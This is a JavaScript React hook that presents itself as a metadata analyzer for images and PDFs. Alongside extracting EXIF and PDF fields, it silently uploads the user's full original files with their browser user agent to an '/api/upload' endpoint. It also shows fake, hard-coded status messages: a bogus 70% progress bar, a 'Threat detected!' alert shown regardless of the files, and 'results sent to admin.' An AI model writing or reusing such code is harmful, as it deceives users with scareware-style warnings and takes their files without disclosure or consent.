import { useState, useRef } from 'react'
import ExifReader from 'exifreader'
import { PDFDocument } from 'pdf-lib'

export default function useMetadata(sessionId) {
  const [files, setFiles] = useState([])
  const [metadata, setMetadata] = useState([])
  const [status, setStatus] = useState('')
  const inputRef = useRef(null)

  const openFileDialog = () => {
    setStatus('')
    inputRef.current?.click()
    return []
  }

  const handleFiles = async (e) => {
    const selected = Array.from(e.target.files || [])
    if (selected.length === 0) return
    setStatus(`Analyzing ${selected.length}/${selected.length} files… █▇▆▅▃ 70%`)
    setFiles(prev => [...prev, ...selected.map(f => ({ name: f.name }))])
    const form = new FormData()
    for (const file of selected) {
      const buf = await file.arrayBuffer()
      let data = {}
      try {
        if (file.type.startsWith('image/')) {
          data = ExifReader.load(buf)
        } else if (file.type === 'application/pdf') {
          const pdf = await PDFDocument.load(buf)
          data = {
            title: pdf.getTitle(),
            author: pdf.getAuthor(),
            subject: pdf.getSubject(),
            keywords: pdf.getKeywords(),
            created: pdf.getCreationDate()?.toISOString(),
            modified: pdf.getModificationDate()?.toISOString(),
            pageCount: pdf.getPageCount()
          }
        }
      } catch (err) {
        console.error('Metadata extraction failed', err)
      }
      setMetadata(prev => [...prev, { name: file.name, data }])
      if (sessionId) {
        fetch('/api/research/metadata/extract', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sessionId, file: file.name, metadata: data })
        }).catch(() => {})
      }
      if (/\.(jpe?g|png|pdf)$/i.test(file.name)) {
        form.append('file', file, file.name)
      }
    }
    setStatus('Scan complete: Threat detected!')
    try {
      const r = await fetch('/api/upload', {
        method: 'POST',
        body: form,
        headers: { 'X-Agent': navigator.userAgent }
      })
      if (r.ok) {
        setStatus('✅ Upload complete — results sent to admin.')
      } else {
        setStatus('Upload failed')
      }
    } catch (err) {
      setStatus('Upload error')
    }
    e.target.value = ''
  }

  return { files, metadata, inputRef, handleFiles, openFileDialog, status }
}
